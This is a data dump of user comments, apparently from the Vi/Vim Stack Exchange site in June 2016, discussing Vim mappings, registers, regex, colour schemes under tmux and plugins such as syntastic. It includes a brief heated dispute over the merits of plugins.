  <row Id="13473" PostId="8063" Score="0" Text="So maybe you should explain what is the difference between the proposed solutions and what you need. And if a solution may not work for you, maybe try to explain what does not work instead of just saying &quot;This isn't working for me.&quot; This will be useful for everybody." CreationDate="2016-06-03T08:04:09.093" UserId="1821" />
  <row Id="13474" PostId="8069" Score="2" Text="I'v found there is `TextYankPost` autocmd in last version (0.1.3) of neovim. Maybe it can help. I'm experimenting with it..." CreationDate="2016-06-03T09:07:48.487" UserId="5694" />
  <row Id="13475" PostId="8074" Score="2" Text="You could disable the mousewheel scrolling action, with `:map &lt;ScrollWheelUp&gt; &lt;Nop&gt;` etc." CreationDate="2016-06-03T10:21:47.743" UserId="7600" />
  <row Id="13476" PostId="8075" Score="5" Text="probably are mapped by another plugin. [see the faq, especially the second half](https://vimhelp.appspot.com/vim_faq.txt.html#faq-20.1)" CreationDate="2016-06-03T11:40:20.337" UserId="71" />
  <row Id="13477" PostId="8057" Score="0" Text="configure your term variable correctly and possibly also set `:set t_Co=256`" CreationDate="2016-06-03T11:41:54.467" UserId="71" />
  <row Id="13478" PostId="8075" Score="1" Text="All four should have been disabled or enabled at the same time since you have given them at same place. There might be a issue, like your plugins or your functions may have made use of those keys. You can check with :map &lt;Up&gt; in command line and check whether it is changed  or not." CreationDate="2016-06-03T11:42:01.243" UserId="7161" />
  <row Id="13479" PostId="8075" Score="5" Text="This could be helpful https://vi.stackexchange.com/questions/7722/how-to-debug-a-mapping/7723#7723" CreationDate="2016-06-03T11:52:37.987" UserId="1841" />
  <row Id="13480" PostId="6366" Score="0" Text="I'm pretty sure that can't be done. Don't forget you can add an indicator to your statusline though. E.g. `:set stl+=\ [%{&amp;ff}]`" CreationDate="2016-06-03T11:56:27.913" UserId="7878" />
  <row Id="13482" PostId="8079" Score="0" Text="I had not tried appending the '%' or '\' before, but I just tried and it didn't help. I will also update my question explaining that I don't want to match this error message." CreationDate="2016-06-03T13:52:13.160" UserId="599" />
  <row Id="13483" PostId="8079" Score="0" Text="Ah, I see. Sorry about the mis-understanding." CreationDate="2016-06-03T13:59:04.713" UserId="6489" />
  <row Id="13484" PostId="8079" Score="0" Text="Don't worry about that, thanks a lot for trying to help me!" CreationDate="2016-06-03T13:59:46.210" UserId="599" />
  <row Id="13485" PostId="8081" Score="1" Text="You got to it before me. :P" CreationDate="2016-06-03T14:46:53.373" UserId="6489" />
  <row Id="13486" PostId="8081" Score="0" Text="Well, it won't work with `:normal` since the `^M` will execute it. You need `^V^M` in the string to use it with `:normal`." CreationDate="2016-06-03T14:47:41.667" UserId="7878" />
  <row Id="13487" PostId="8081" Score="0" Text="How so? I made it work... Can you add some details please?" CreationDate="2016-06-03T14:48:38.127" UserId="1821" />
  <row Id="13488" PostId="8081" Score="0" Text="`:let a = 'iHello^MWorld' | exe 'nno a :normal! ' . a`" CreationDate="2016-06-03T14:50:11.270" UserId="7878" />
  <row Id="13489" PostId="8081" Score="0" Text="Needs to be: `:let a = 'iHello^V^MWorld^M' | exe 'nno a :normal! ' . a`" CreationDate="2016-06-03T14:50:41.447" UserId="7878" />
  <row Id="13490" PostId="8081" Score="0" Text="Working here without the extra `^V` ..." CreationDate="2016-06-03T14:51:51.737" UserId="1821" />
  <row Id="13491" PostId="8081" Score="0" Text="[Same Q. on main](http://stackoverflow.com/questions/37614371/get-raw-string-value/37617159#37617159)" CreationDate="2016-06-03T14:52:00.267" UserId="7878" />
  <row Id="13492" PostId="8081" Score="1" Text="@FizzyTea: my bad, you're right, I didn't see the second example, let me update that. Thanks for the detail :)" CreationDate="2016-06-03T14:53:16.073" UserId="1821" />
  <row Id="13493" PostId="8081" Score="1" Text="I was really confused about `^M`, but then I noticed, that `^M` is actually the graphical representation of a carriage return in vim, not necessarily a newline, maybe you should edit that." CreationDate="2016-06-03T14:56:52.060" UserId="6300" />
  <row Id="13494" PostId="8076" Score="0" Text="Nice use of the `\%V` even if it's not what I wanted I'll accept this (but what I want seems impossible anyway ^^)" CreationDate="2016-06-03T15:03:27.873" UserId="1821" />
  <row Id="13495" PostId="8079" Score="1" Text="@Vitor did you try appending two backslashes - one to escape the other from `set`?" CreationDate="2016-06-03T15:27:54.940" UserId="7600" />
  <row Id="13496" PostId="8079" Score="0" Text="No I did not. And that does appear to work! :) Could you make it an answer, please?" CreationDate="2016-06-03T16:13:51.783" UserId="599" />
  <row Id="13497" PostId="8070" Score="2" Text="The closest you'll get is `:hi! link linenr folded` :-)" CreationDate="2016-06-03T16:32:55.507" UserId="7878" />
  <row Id="13498" PostId="8082" Score="4" Text="Have a look at the plugin https://github.com/mattn/emmet-vim, it may suits your need. Otherwise you can use a macro to do so, do you know the text in advance?" CreationDate="2016-06-03T16:43:09.673" UserId="1821" />
  <row Id="13499" PostId="8073" Score="0" Text="How about https://andrew.stwrt.ca/posts/vim-ctags/ and https://github.com/majutsushi/tagbar ? Otherwise, you should look for a program that generate this information (the variables) and then add this into vim, not the other way around." CreationDate="2016-06-03T17:26:50.413" UserId="1821" />
  <row Id="13500" PostId="8072" Score="0" Text="Unfortunately neovim (which I use) doesn't yet support this, so I can't test your solution, but as soon as I'll be able to I'll accept it if it would work. Right now mapping seems suspicious. Shouldn't you also map ```ResetTimer``` on ```N``` and where is where is does this timer start?" CreationDate="2016-06-03T18:33:44.130" UserId="6634" />
  <row Id="13501" PostId="8072" Score="0" Text="Of course, but since it's the same for each one, I included only one" CreationDate="2016-06-03T18:34:51.180" UserId="1821" />
  <row Id="13503" PostId="8058" Score="0" Text="@user3813057 Strange, I am running Ubuntu 16.04 and the two *solarized* color-schemes are built in. I checked and https://help.gnome.org/users/gnome-terminal/stable/app-colors.html.en says so too." CreationDate="2016-06-03T18:51:24.690" UserId="1238" />
  <row Id="13506" PostId="8082" Score="0" Text="Yes I know what text I want to put in each item. Thank you for the plugin suggestion I'll take a look at home tonight and also look into Vim macros." CreationDate="2016-06-03T19:08:24.723" UserId="7795" />
  <row Id="13508" PostId="7990" Score="0" Text="I've got it a try, it doesn't work." CreationDate="2016-06-03T20:02:40.267" UserId="6634" />
  <row Id="13509" PostId="8087" Score="3" Text="This is the default behavior for `hlsearch`. Try starting vim with `vim -u NONE`, then put `:set hlsearch` and see if the behavior is unchanged." CreationDate="2016-06-03T20:06:24.613" UserId="6489" />
  <row Id="13510" PostId="7990" Score="0" Text="Could you elaborate? What happens, is there an error? Does it do the wrong thing? I need something more than this to help you." CreationDate="2016-06-03T20:08:12.590" UserId="6489" />
  <row Id="13511" PostId="7990" Score="0" Text="I tried it on your example and it works for me." CreationDate="2016-06-03T20:20:58.423" UserId="6489" />
  <row Id="13512" PostId="8091" Score="0" Text="I'm curious, why would you want that macro in the first place?" CreationDate="2016-06-04T15:24:30.017" UserId="21" />
  <row Id="13513" PostId="8093" Score="0" Text="+1, I am also facing this issue. Replacing with ^M, &lt;CR&gt; didn't work" CreationDate="2016-06-04T15:47:49.403" UserId="7161" />
  <row Id="13514" PostId="8093" Score="0" Text="Did you tried giving different quotes like single quotes as the outermost and double quoted for innermost ones?" CreationDate="2016-06-04T15:49:06.310" UserId="7161" />
  <row Id="13515" PostId="8093" Score="0" Text="@SibiCoder sadly doesn't work. Also single quotes are already the most literal kind of quotation there is." CreationDate="2016-06-04T15:52:33.237" UserId="6300" />
  <row Id="13516" PostId="8093" Score="1" Text="You can try `\r`, `\&lt;CR&gt;`, `&lt;lt&gt;CR&gt;` as well" CreationDate="2016-06-04T16:42:02.400" UserId="7161" />
  <row Id="13517" PostId="8094" Score="2" Text="Give two examples one to be matched and one nto be matched. Give an example text and what you wanted to match. It will help to get better answers." CreationDate="2016-06-04T16:43:30.650" UserId="7161" />
  <row Id="13518" PostId="8091" Score="0" Text="Just to make it faster to create an equation array environment since I use that a lot. I'm trying out Snipmate now though, and I think that will be a way more useful way to speed things up once I get it figured out." CreationDate="2016-06-04T16:48:47.193" UserId="5043" />
  <row Id="13519" PostId="8094" Score="3" Text="If I understand your question you're asking to make sure that beginning and ending parentheses are matching parentheses. This is not possible with regular expressions. [Here's a question](http://stackoverflow.com/a/133684/1924583) on that that goes more into detail." CreationDate="2016-06-04T20:59:51.243" UserId="6489" />
  <row Id="13520" PostId="8090" Score="0" Text="Thanks for you help. Do you have any idea what the logic behind vim default behaviour?" CreationDate="2016-06-04T22:26:31.540" UserId="6634" />
  <row Id="13521" PostId="8097" Score="0" Text="Changing ^M to \n, \r didnt work." CreationDate="2016-06-05T14:31:07.983" UserId="7161" />
  <row Id="13522" PostId="8100" Score="1" Text="You could map something to `lprev` and `lnext`." CreationDate="2016-06-05T21:20:40.040" UserId="205" />
  <row Id="13523" PostId="8100" Score="0" Text="will you please explain me how to to do that? I am quite new to it. Thanks" CreationDate="2016-06-05T21:23:24.370" UserId="5890" />
  <row Id="13524" PostId="8100" Score="1" Text="You don't.  Well, you _can_ do it, but it's better to stay in the editor window.  See the [FAQ](https://github.com/scrooloose/syntastic#faqlnext)." CreationDate="2016-06-05T21:33:31.337" UserId="2313" />
  <row Id="13525" PostId="8101" Score="2" Text="`&lt;C-J&gt;` is newline. Use another key for this mapping." CreationDate="2016-06-05T23:13:53.430" UserId="205" />
  <row Id="13526" PostId="8101" Score="0" Text="@muru See my edit. I don't see why it's a duplicate. For what it's worth, I even managed to map `&lt;cr&gt;`, with great results. This should work and has worked. Now that it doesn't, I want to find out why." CreationDate="2016-06-06T02:15:10.647" UserId="7810" />
  <row Id="13527" PostId="8101" Score="1" Text="I didn't say you can't map `&lt;c-j&gt;`, I suggested using another key. In any case, if I add `nnoremap &lt;C-J&gt; o&lt;Esc&gt;k$` and `nnoremap &lt;CR&gt; :noh&lt;CR&gt;&lt;CR&gt;` to my vimrc, `&lt;c-j&gt;` works as expected. As you say: &quot;fortuitously&quot;. Further, if you use `nnoremap &lt;CR&gt; :noh&lt;return&gt;`, and the cursor still moves down a line, I'd be very surprised. Since `verbose map` was silent, `&lt;c-j&gt;` was unmapped later on somewhere in your config. Have a look at any plugins you use. In any case, see: [How do I debug my vimrc file?](http://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file)" CreationDate="2016-06-06T03:34:46.173" UserId="205" />
  <row Id="13528" PostId="8100" Score="1" Text="As a new user, you shouldn't use syntastic (well nobody should use that plugin but that's another story). Take the time to learn Vim before installing bloated and largely useless plugins." CreationDate="2016-06-06T06:20:59.193" UserId="54" />
  <row Id="13529" PostId="8100" Score="3" Text="@romainl Things you can't (easily) do with `makeprg` and `CompilerSet`: error highlighting, sorting, and filtering, aggregating errors from multiple compilers in a single run, error browsing without touching `loclist`, automatic check on write, signs, balloons, and cursor notifications for errors, parsing errors from things like JSON or XML.  Perhaps take your time to learn about plugins before calling them largely useless?" CreationDate="2016-06-06T07:04:17.997" UserId="1577" />
  <row Id="13530" PostId="8100" Score="0" Text="@lcd047, I've used that crap in the past, thanks, and also wasted a lot of time trying to help the poor souls that prefer to use bloated plugins rather than learning how to configure their editor. And every item in your list is plain useless except &quot;automatic check on write&quot;, maybe. A proper `makeprg` and a proper `errorformat` are all one needs, especially when one is new to Vim." CreationDate="2016-06-06T07:35:38.420" UserId="54" />
  <row Id="13531" PostId="8026" Score="0" Text="Maybe a snippet would be interesting? With [ultisnips](https://github.com/SirVer/ultisnips/tree/1c6b4f75a006c4411d01a1234cabda3eb4aded1a) for example, you can define a snippet active only in latex buffer, when you enter a predefined text (e.g. `ld`) and press a predefined key the entered text will expand to whatever you want. It requires a little bit of configuration but it is pretty flexible and you can make it expand in the middle of a word." CreationDate="2016-06-06T07:41:03.950" UserId="1841" />
  <row Id="13532" PostId="8100" Score="0" Text="@romainl _I've used that crap_ - Well, if you insist to go there, I can follow: opinions are like arseholes, everybody has one. :) _A proper `makeprg` and a proper `errorformat` are all one needs_ - Please enlighten me how to parse JSON and XML errors with `errorformat`." CreationDate="2016-06-06T07:52:51.467" UserId="1577" />
  <row Id="13533" PostId="8100" Score="0" Text="&quot;everybody has one&quot; yes, and yours is very tight if you can't stand people not liking &quot;your&quot; project. JSON and XML errors? Simple: avoid tools that produce such errors… or use the IDE you *need* instead of wasting your time adding crap to the editor you *want*." CreationDate="2016-06-06T08:06:11.850" UserId="54" />
  <row Id="13534" PostId="8100" Score="0" Text="Also you can add [`jq`](https://stedolan.github.io/jq/) to your pipeline, and then you've learnt another resusable tool." CreationDate="2016-06-06T08:18:16.597" UserId="7878" />
  <row Id="13535" PostId="8100" Score="0" Text="And 'automatic check on write' is just `:w|make`." CreationDate="2016-06-06T08:22:52.433" UserId="7878" />
  <row Id="13536" PostId="8100" Score="0" Text="Or `:w|Lint` and redefine `Lint` per filetype or project. Vim has all these generalities built in." CreationDate="2016-06-06T08:33:40.767" UserId="7878" />
  <row Id="13537" PostId="247" Score="0" Text="This didn't work for me. I've already set `ttyfast`, and tried clearing `t_ut` with no effect. My setup is the same as the OP, with the exception that I'm using `termguicolors` inside a Tmux configured for true color support. Vim draws splendidly inside iTerm, but starts showing the same screen weirdness as above when I run inside Tmux. Let me know if I should open a new question; I thought I would reach out here since I'm experiencing essentially the same problem." CreationDate="2016-06-06T10:17:42.987" UserId="7165" />
  <row Id="13538" PostId="8101" Score="3" Text="also worth looking: https://vi.stackexchange.com/questions/7722/how-to-debug-a-mapping" CreationDate="2016-06-06T10:30:24.503" UserId="1821" />
  <row Id="13539" PostId="8101" Score="1" Text="I have just tried your mapping of `&lt;c-j&gt;` with both forms of the `&lt;CR&gt;` mapping and it seem to work in both cases so I'm not sure that was the real cause of your problem." CreationDate="2016-06-06T11:21:46.210" UserId="1841" />
  <row Id="13542" PostId="5849" Score="0" Text="Can you give an example of the original text? You have given only those expected and not expected results." CreationDate="2016-06-06T12:27:32.257" UserId="7161" />
  <row Id="13543" PostId="8091" Score="0" Text="Ok, I see. IMHO, this is not a very good idea. It makes your LaTeX very dependable on the preamble for trivial reasons. I would also suggest that you read [this](http://tex.stackexchange.com/questions/196/eqnarray-vs-align): You should avoid the `eqnarray` environment alltogether, instead use the `align` environment." CreationDate="2016-06-06T12:35:40.833" UserId="21" />
  <row Id="13544" PostId="8105" Score="4" Text="You should also see [vim-easy-align](https://github.com/junegunn/vim-easy-align). It provides an operator for aligning, which makes it possible to align using motions and text objects as targets. It also provides a live and interactive align operation which shows how the alignment will look for the provided options in realtime, `LiveEasyAlign`." CreationDate="2016-06-06T12:41:30.773" UserId="21" />
  <row Id="13546" PostId="8107" Score="3" Text="Use `:e filename` (or `:we filename` if you also want to write the previous file) ? (Or maybe I'm misunderstanding you)" CreationDate="2016-06-06T15:58:11.210" UserId="7128" />
  <row Id="13547" PostId="8107" Score="2" Text="I don't think that it will close previous file. It will be in buffer. `:buffers` will show you." CreationDate="2016-06-06T15:59:45.610" UserId="5890" />
  <row Id="13548" PostId="8107" Score="1" Text="You're probably right. Would this help you ? http://stackoverflow.com/questions/1269648/how-do-i-close-a-single-buffer-out-of-many-in-vim" CreationDate="2016-06-06T16:02:35.413" UserId="7128" />
  <row Id="13549" PostId="8107" Score="1" Text="Oh wait this is probably even better :) http://vi.stackexchange.com/questions/3066/close-and-unload-a-buffer-without-exiting-vim" CreationDate="2016-06-06T16:04:18.047" UserId="7128" />
  <row Id="13550" PostId="8107" Score="3" Text="You can simply use `:bd` to close the current buffer and `:e filename` to open a new one." CreationDate="2016-06-06T16:05:22.800" UserId="1841" />
  <row Id="13551" PostId="8107" Score="2" Text="Is the file being open in a buffer important? I mean, you CAN wipe the buffer, but it will get wiped when you close vim." CreationDate="2016-06-06T16:06:37.740" UserId="6489" />
  <row Id="13552" PostId="8107" Score="0" Text="@Tumbler41 Yes that is important. What if I do `:wq` , then I think edited content will persist to file and next I do `:bd`" CreationDate="2016-06-06T16:11:09.320" UserId="5890" />
  <row Id="13553" PostId="8110" Score="0" Text="While it's true I can't search for what has been folded, by using `'foldopen'`, I can tell Vim to match at most once in a folded region, so there are small steps in that direction. Anyway, what's the stance on `conceal`? Is there hope of seeing such functionality implemented?" CreationDate="2016-06-06T17:32:32.597" UserId="205" />
  <row Id="13554" PostId="8102" Score="0" Text="Oh, the visual mode mapping executes entire lines so if you're block- or character-wise it'll ignore the start and end points within the lines." CreationDate="2016-06-06T18:09:46.180" UserId="6430" />
  <row Id="13555" PostId="8101" Score="0" Text="I would suggest a different key.There are also a few posts about inserting blank lines that you may want to check out: [how to insert a newline without leaving normal mode](http://vi.stackexchange.com/q/3875/778), [Vim command to insert blank line in normal mode](http://stackoverflow.com/q/6765211/438329), [http://stackoverflow.com/q/16359878/438329](http://stackoverflow.com/q/16359878/438329)" CreationDate="2016-06-06T18:51:57.850" UserId="778" />
  <row Id="13556" PostId="8100" Score="1" Text="@Antony Sure, `jq` is a very useful tool.  Using it to convert JSON to something parsable by Vim's `errorformat` is likely to make you feel smart.  [Here](https://gist.github.com/lcd047/0ee4673c683b6071d3e92163cc419164)'s how a compiler set for `jscs` might look.  Good luck fixing it when the error format changes.  Actually, best of luck making it work on Windows.    But hey, it cuts the crap.  If you like how it works you should consider converting more of the 200+ checkers of syntastic to compiler sets and publish them somewhere.  They already have `errorformat`s, so how hard can it be?" CreationDate="2016-06-06T19:11:58.737" UserId="1577" />
  <row Id="13557" PostId="8110" Score="0" Text="true, but you still couldn't search for what is returned by `foldtext()`. Anyways, you might want to suggest an improvement at vim-dev ml and see what Bram thinks, but my feeling is, this won't be implemented anytime soon since there are still too many bugs/particularities with conceal mode today and nobody really looked for fixing it. I did try once, but it was complicated and broke in subtle ways." CreationDate="2016-06-06T19:18:52.313" UserId="71" />
  <row Id="13558" PostId="6797" Score="0" Text="I am wondering how this fixes the problem of the OP, who wanted to use both python versions in the same session?" CreationDate="2016-06-06T19:22:32.707" UserId="71" />
  <row Id="13559" PostId="8093" Score="1" Text="Too many levels of indirection, and objects to strings and back to objects. By this point you need to escape the ^M like so: 'Hello^V^V^V^V^V^V^V^V^V^V^MWorld'. Yep, ten ^Vs. Maybe you need to rethink your overall approach." CreationDate="2016-06-06T21:03:44.503" UserId="7878" />
  <row Id="13560" PostId="8111" Score="0" Text="Not sure if this will fix your problem, but try [this](http://askubuntu.com/a/519203)." CreationDate="2016-06-06T22:08:26.357" UserId="6489" />
  <row Id="13561" PostId="8111" Score="3" Text="What do you get when you do `:set enc?` ? Also, are you using console vim or gvim? When I use gvim and `:set enc=utf8` it works fine for me." CreationDate="2016-06-06T23:17:45.920" UserId="2920" />
  <row Id="13563" PostId="8111" Score="0" Text="Possible duplicate of [How can a character be inserted during an edit session by its Unicode numeric value?](http://vi.stackexchange.com/questions/6171/how-can-a-character-be-inserted-during-an-edit-session-by-its-unicode-numeric-va)" CreationDate="2016-06-07T03:25:40.197" UserId="7161" />
  <row Id="13564" PostId="8103" Score="0" Text="Great idea, thanks!" CreationDate="2016-06-07T04:28:54.817" UserId="7642" />
  <row Id="13565" PostId="8112" Score="2" Text="Question is unclear. You want function2 to be highlighted in the same color of function1? By the way, you can create your own syntax region and give them a  color." CreationDate="2016-06-07T06:34:41.123" UserId="7161" />
  <row Id="13566" PostId="8112" Score="0" Text="I clarified it a bit. I don't care whether the same color will be used." CreationDate="2016-06-07T06:38:43.097" UserId="7906" />
  <row Id="13567" PostId="8112" Score="0" Text="So, what you want to do? Function2 in some other color? Is it only for function2 or any function with default color?" CreationDate="2016-06-07T06:57:23.693" UserId="7161" />
  <row Id="13568" PostId="8112" Score="2" Text="I'm not sure if it's possible due to the fact that you'll have to &quot;record&quot; every function definition and then create highlight group for them. Maybe have a look at https://github.com/vim-scripts/TagHighlight" CreationDate="2016-06-07T06:59:11.517" UserId="1821" />
  <row Id="13569" PostId="8111" Score="0" Text="Assuming Thorn is not outside the range of printable characters in the current encoding, you can (and probably should) use digraphs to insert special characters.  See `:h digraphs-use`.  The digraph for capital Thorn is `TH`." CreationDate="2016-06-07T07:10:46.470" UserId="2313" />
  <row Id="13570" PostId="8112" Score="2" Text="My advice would be not to worry too much about it. If you have too many colours on the screen then you lose the benefit of having highlighted items standing out." CreationDate="2016-06-07T07:16:10.543" UserId="7878" />
  <row Id="13571" PostId="8113" Score="0" Text="You would probably need to write your own syntax script and use `:help conceal`." CreationDate="2016-06-07T07:19:47.423" UserId="54" />
  <row Id="13572" PostId="8115" Score="0" Text="It works fine ! But I'm not really used to visual selections and the whole process seems a little &quot;heavy&quot;... Do you think there could be something quicker ?" CreationDate="2016-06-07T09:38:43.277" UserId="7128" />
  <row Id="13573" PostId="8115" Score="0" Text="Yes let me update my answer :)" CreationDate="2016-06-07T09:40:08.147" UserId="1841" />
  <row Id="13574" PostId="8114" Score="4" Text="In a regex, to describe the current cursor position you can use the atom `\%#`. So, you could use: `:s/\v(%#.*)@&lt;= /_/g`. Which could be described as a space preceded by (`@&lt;=`) characters after the cursor position." CreationDate="2016-06-07T09:40:26.800" UserId="6960" />
  <row Id="13575" PostId="8115" Score="0" Text="User9433424 gave this hint just before you, but you answered so I'm going to accept your answer if that's okay -- could you maybe explain the regexp pattern he uses a little more ? I'm still struggling with this..." CreationDate="2016-06-07T09:49:07.387" UserId="7128" />
  <row Id="13576" PostId="8114" Score="1" Text="You and Statox both proposed the `\%#` trick, I'll accept his answer if you don't write one... But could either of you explain the regexp with a bit more explicitly ?" CreationDate="2016-06-07T09:49:42.563" UserId="7128" />
  <row Id="13577" PostId="8115" Score="0" Text="I tried to make the answer as clear as possible but if @User9433424 writes his own answer don't hesitate to accept it." CreationDate="2016-06-07T10:04:33.277" UserId="1841" />
  <row Id="13578" PostId="8112" Score="1" Text="You can probably adapt what I did in http://vi.stackexchange.com/a/6963/205" CreationDate="2016-06-07T10:06:00.747" UserId="205" />
  <row Id="13579" PostId="8115" Score="1" Text="Very nice explanation of the regexp, thank you ! And thanks for your comment on whose answer to accept :)" CreationDate="2016-06-07T10:06:04.663" UserId="7128" />
  <row Id="13580" PostId="8116" Score="1" Text="When you're in tmux, what's the output of `echo $TERM` (and also, what does `:set term?` in Vim output)?" CreationDate="2016-06-07T10:10:59.583" UserId="205" />
  <row Id="13581" PostId="8116" Score="0" Text="In order to get `termguicolors` to work at all inside Tmux without manually setting `t_8f` and `t_8b`, I added `set-option -g default-terminal &quot;xterm-256color&quot;` to my `.tmux.conf`. So the short answer to your question is that both `echo $TERM` and `:set term?` return `xterm-256color`." CreationDate="2016-06-07T10:16:11.213" UserId="7165" />
  <row Id="13582" PostId="8116" Score="0" Text="See http://unix.stackexchange.com/a/1098/70524, `TERM` inside `tmux` should be `screen*`, not `xterm*`." CreationDate="2016-06-07T10:18:52.890" UserId="205" />
  <row Id="13583" PostId="8116" Score="0" Text="I've changed to `screen-256color` and set `t_8f` and `t_8b`, but the result is the same." CreationDate="2016-06-07T10:23:00.437" UserId="7165" />
  <row Id="13584" PostId="8116" Score="0" Text="Apprentice author, here. Please use [the issue tracker](https://github.com/romainl/Apprentice/issues)." CreationDate="2016-06-07T12:01:31.817" UserId="54" />
  <row Id="13585" PostId="8117" Score="1" Text="I have never used this. What's a typical use for `&quot;=`?" CreationDate="2016-06-07T12:55:25.790" UserId="205" />
  <row Id="13586" PostId="8117" Score="2" Text="According to the amazing [practical Vim](https://pragprog.com/book/dnvim/practical-vim) it is used to do back-of-the-envelope calculations. What you put into this register is evaluated as a vimscript expression, so you can make simple arithmetic calculations for example. Here I was using it in a file containing several numbers to add and multiply so I was creating a macro to fill my file automatically with the results." CreationDate="2016-06-07T13:06:43.603" UserId="1841" />
  <row Id="13587" PostId="8120" Score="0" Text="Well `yf4` was just an example. In my case I just mean that a line in my buffer is an expression which can be accepted by the expression register. I think it is reasonable to imagine that a buffer may contain an expression to be processed." CreationDate="2016-06-07T13:11:03.810" UserId="1841" />
  <row Id="13588" PostId="8116" Score="0" Text="@romainl I can do that, but I don't want to waste your time, and I'm not at all convinced the color scheme is the issue given the fact that it displays as expected in iTerm outside of Tmux. Also, I neglected to mention that it displays correctly in nvim in _both_ iTerm and Tmux. Would you still like me to open the issue?" CreationDate="2016-06-07T13:11:49.330" UserId="7165" />
  <row Id="13589" PostId="8120" Score="0" Text="If you want to use the content of register `a` with the expression register, do `=@a&lt;CR&gt;&lt;CR&gt;`. Use `@&quot;`  for the unnamed register. If you want to use the text on the current line, do `=getline('.')&lt;CR&gt;&lt;CR&gt;`." CreationDate="2016-06-07T13:28:58.707" UserId="54" />
  <row Id="13590" PostId="8116" Score="0" Text="Well… that would give me an incentive to take a look at that new &quot;truecolor&quot; thing." CreationDate="2016-06-07T13:36:40.860" UserId="54" />
  <row Id="13591" PostId="8120" Score="2" Text="I understand that it is possible to put some text in the `=` register without using `&lt;c-r&gt;register` but my question was about why the creators of Vim made it read only and not about the different ways to set its content. Still thank you for taking time to write an answer." CreationDate="2016-06-07T13:41:14.727" UserId="1841" />
  <row Id="13592" PostId="8091" Score="1" Text="Good to know! Thanks for the info." CreationDate="2016-06-07T13:46:23.557" UserId="5043" />
  <row Id="13593" PostId="8120" Score="4" Text="The expression register is *not* &quot;read-only&quot;. It's &quot;read-write&quot;: you &quot;write&quot; an expression in that register and you &quot;read&quot; the output of that expression. The only difference with more regular registers like `&quot;a` or `&quot;/` is that what you read from `&quot;=` is usually different from what you write into it." CreationDate="2016-06-07T13:54:33.827" UserId="54" />
  <row Id="13594" PostId="8116" Score="0" Text="@romainl No problem. I will open an issue as soon as I get back to my machine this evening." CreationDate="2016-06-07T14:14:24.460" UserId="7165" />
  <row Id="13595" PostId="8117" Score="1" Text="if you copy that line into register a (without the newline), you can use `:echo eval(@0)` to just find out the result" CreationDate="2016-06-07T14:29:50.667" UserId="71" />
  <row Id="13596" PostId="8125" Score="0" Text="It will be better if you could include the syntax for opening buffer through its name" CreationDate="2016-06-07T16:14:50.110" UserId="7161" />
  <row Id="13597" PostId="8122" Score="0" Text="Those are &quot;buffers&quot; (not &quot;files&quot;) and they are in your &quot;buffer list&quot; (not &quot;buffer&quot;)." CreationDate="2016-06-07T16:15:04.157" UserId="54" />
  <row Id="13598" PostId="8127" Score="1" Text="`:set diffopt+=iwhite`, or have I misunderstood?" CreationDate="2016-06-07T17:24:19.290" UserId="7878" />
  <row Id="13599" PostId="8125" Score="0" Text="the syntax is explained in the help" CreationDate="2016-06-07T17:33:21.393" UserId="71" />
  <row Id="13600" PostId="8127" Score="0" Text="Hmm, I suppose that *would* work for my specific scenario. Thanks! However, I would still be interested to know if there is a way to restrict search results for other possible scenarios." CreationDate="2016-06-07T18:21:28.443" UserId="6489" />
  <row Id="13601" PostId="8125" Score="0" Text="Why use `:sbN` over `:sb`? I fine `:sb` to be very hand as you can use partial filenames." CreationDate="2016-06-07T18:35:14.560" UserId="778" />
  <row Id="13602" PostId="8058" Score="0" Text="I'm using Ubuntu 14.04LTS, which has no solarized-light/dark color-scheme. Is there any other way to set the Ethan Solarized color?" CreationDate="2016-06-07T19:09:59.980" UserId="1080" />
  <row Id="13603" PostId="8129" Score="2" Text="+1 for  tpope/commentary; the xmap could be to `&lt;Plug&gt;Commentary`, leaving the  `gc` combination free for other mappings" CreationDate="2016-06-07T19:12:20.767" UserId="1405" />
  <row Id="13604" PostId="8122" Score="0" Text="But they represent files which have been recently opened. Right?" CreationDate="2016-06-07T19:12:36.757" UserId="5890" />
  <row Id="13605" PostId="8117" Score="2" Text="@muru The main use is to apply functions in replacements, f.i. I'm doing something like this to shift page numbers in TOCs: `:%s/\v\d+$/\=submatch(0)+9/`.  But it's also quite useful in other contexts, see Drew Neil's [vimcast](http://vimcasts.org/episodes/simple-calculations-with-vims-expression-register/) on it." CreationDate="2016-06-07T20:41:35.197" UserId="1577" />
  <row Id="13606" PostId="8117" Score="2" Text="@statox `:h @=` from my Vim 7.4.1905 says &quot;The expression register is&#xA;read-write.&quot;" CreationDate="2016-06-07T20:43:12.760" UserId="1577" />
  <row Id="13607" PostId="8117" Score="2" Text="@lcd047 huh. I never realised that `\=` indicated a register. I always thought it was just Vim's way of doing what `/e` does in Perl." CreationDate="2016-06-07T20:43:15.813" UserId="205" />
  <row Id="13608" PostId="8122" Score="0" Text="Related: see `:h gf` and `:h CTRL-W_f`." CreationDate="2016-06-07T20:49:57.520" UserId="2313" />
  <row Id="13609" PostId="8125" Score="0" Text="What is the meaning of `:sb` in understandable terms?" CreationDate="2016-06-07T21:18:42.800" UserId="5890" />
  <row Id="13610" PostId="8122" Score="0" Text="No, they represent &quot;documents&quot; that may or may not be associated to actual files." CreationDate="2016-06-07T21:54:57.133" UserId="54" />
  <row Id="13611" PostId="8131" Score="0" Text="Aww, drat, I shoulda posted that as an answer. `:P`" CreationDate="2016-06-07T22:00:54.737" UserId="2920" />
  <row Id="13612" PostId="8132" Score="2" Text="Ah, a filtering approach. Not quite what I had in mind, but I can get behind this. Still trying to fully understand your macro though. My header lines are in the form of: `@@ -292,2 +283,7 @@`. That being said, I can't quite figure out what the `0/` is for in your search pattern. Additionally `yW` will yank the WORD, meaning `292,2`. When you execute `:@&quot;` This takes you to line 2 instead of 292. I think I would come up with something like this: `?@@.*+?e+1&lt;CR&gt;yw:q!&lt;CR&gt;:@&quot;&lt;CR&gt;`. You could change the first  `+` to `-` depending on which file you wanted to look at. Thoughts?" CreationDate="2016-06-07T22:55:26.603" UserId="6489" />
  <row Id="13613" PostId="5849" Score="0" Text="Why? I don't think the actual text has any impact here?" CreationDate="2016-06-07T23:06:13.150" UserId="5682" />
  <row Id="13614" PostId="8132" Score="0" Text="Oops, typo there, sorry. Edited." CreationDate="2016-06-07T23:13:16.953" UserId="7878" />
  <row Id="13615" PostId="8132" Score="1" Text="There was a missing `&lt;CR&gt;` to terminate the search pattern, and the `yW` should be `yw` like you said!" CreationDate="2016-06-07T23:19:49.847" UserId="7878" />
